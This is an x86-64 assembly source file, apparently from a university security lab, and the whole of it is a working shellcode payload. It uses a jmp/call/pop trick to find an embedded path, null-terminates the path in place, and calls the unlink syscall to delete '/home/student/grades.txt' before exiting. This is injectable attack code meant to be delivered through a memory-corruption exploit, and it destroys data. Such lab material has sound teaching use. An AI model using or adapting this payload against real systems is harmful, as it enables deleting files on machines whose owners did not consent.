#include <sys/syscall.h>

#define STRING	"/home/student/grades.txt"
#define STRLEN	24
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+8)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popq	%rcx
	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb	%al,(STRLEN)(%rcx)	/* null-terminate our string */
	movq	%rax,(ENVP)(%rcx)	/* set up null envp */

	movb	$SYS_unlink,%al		/* set up the syscall number */
	movq	%rcx,%rdi		/* syscall arg 1: "/home/student/grades.txt" */
	leaq	ENVP(%rcx),%rsi		/* syscall arg 2: envp */

	syscall				/* invoke SYS_unlink */

	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb    $SYS_exit,%al		/* set up the syscall number */
	xorq	%rdi,%rdi		/* syscall arg 1: 0 */
	syscall				/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING  /*top of stack*/
